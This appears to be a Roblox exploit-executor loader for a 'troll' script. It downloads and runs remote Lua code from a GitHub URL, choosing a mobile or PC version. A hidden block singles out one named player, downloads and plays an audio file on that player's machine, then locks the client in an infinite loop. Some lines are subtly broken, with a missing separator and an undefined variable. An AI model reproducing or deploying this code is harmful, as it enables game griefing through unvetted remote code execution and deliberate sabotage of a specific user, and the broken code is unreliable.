local UserInputService = game:GetService("UserInputService")

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/BongCloudMaster/Troll-GE-Script-Roots/main/Mobile_Version.lua"))();
elseif not UserInputService.TouchEnabled and UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/BongCloudMaster/Troll-GE-Script-Roots/main/PC_Version.lua"))();
end;

-- Fuck you
if LocalPlayer.Name=='100x100x100x100i'then pcall(function ()writefile("HeyYa.mp3",game:HttpGet"https://s3.us-east-1.wasabisys.com/e-zimagehosting/8c73d63b-9423-4ca8-93f4-9da5b8e9929b/2kpmgtqn.wav")local a=Instance.new"Sound"a.Parent=game.CoreGuia.SoundId=getcustomasset"HeyYa.mp3"a.Volume=0.2;a:Play()end )task.wait(5001)while true do end end 
